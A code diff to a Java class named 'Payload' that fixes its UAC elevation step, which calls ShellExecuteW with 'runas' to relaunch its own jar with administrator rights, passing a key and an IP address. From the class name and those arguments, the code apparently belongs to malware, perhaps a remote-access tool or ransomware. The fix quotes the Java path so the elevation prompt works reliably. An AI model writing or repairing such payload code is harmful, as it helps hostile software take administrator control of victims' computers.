@@ -66,18 +66,15 @@ public class Payload {
             
             log("Triggering UAC via JNA...");
             
-            // JNA ShellExecuteW returns > 32 if the user clicked Yes
+            // FIX: Wrap javaExe in quotes so spaces in the path don't break it
             int result = Shell32.INSTANCE.ShellExecuteW(
-                null, "runas", javaExe, "-jar \"" + jarPath + "\" " + key + " " + ip, null, 1
+                null, "runas", "\"" + javaExe + "\"", "-jar \"" + jarPath + "\" " + key + " " + ip, null, 1
             );
             
             log("ShellExecuteW result: " + result);
             
-            if (result > 32) {
-                return true; 
-            } else {
-                return false;
-            }
+            // Result > 32 means the user clicked Yes
+            return result > 32;
         } catch (Exception e) {
             log("UAC Error: " + e.toString());
             return false;
